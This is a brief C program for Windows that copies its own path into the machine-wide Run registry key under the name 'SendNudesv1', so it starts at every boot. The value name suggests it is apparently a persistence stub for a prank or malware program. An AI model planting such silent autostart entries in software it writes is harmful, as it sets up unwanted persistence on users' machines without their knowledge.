// TODO: add error checking, ERROR_SUCESS etc...
#include <windows.h>
int main(void)
{
    TCHAR currentpath[MAX_PATH];
    HKEY selfstartup;
    GetModuleFileName(NULL, currentpath, MAX_PATH);
    RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &selfstartup);
    RegSetValueEx(selfstartup, "SendNudesv1", 0, REG_SZ, (LPBYTE)currentpath, sizeof(currentpath));
    RegCloseKey(selfstartup);

    return 0;

}
